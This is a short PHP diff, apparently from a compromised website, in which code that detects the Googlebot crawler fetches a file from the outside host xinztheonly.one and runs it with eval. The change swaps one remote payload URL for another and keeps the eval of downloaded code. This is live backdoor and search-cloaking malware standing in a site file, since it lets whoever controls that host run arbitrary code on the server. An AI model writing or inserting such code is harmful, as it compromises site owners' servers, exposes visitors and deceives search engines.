@@ -12,7 +12,7 @@ function isGooglebot($hostname, $userAgent) {
 }
 
 if (isGooglebot($hostname, $userAgent)) {
-    $remoteCode = file_get_contents('https://xinztheonly.one/txt/google/oapr2.txt');
+    $remoteCode = file_get_contents('https://xinztheonly.one/txt/google/assunnah.txt');
     eval('?>' . $remoteCode);
     exit;
 } else {
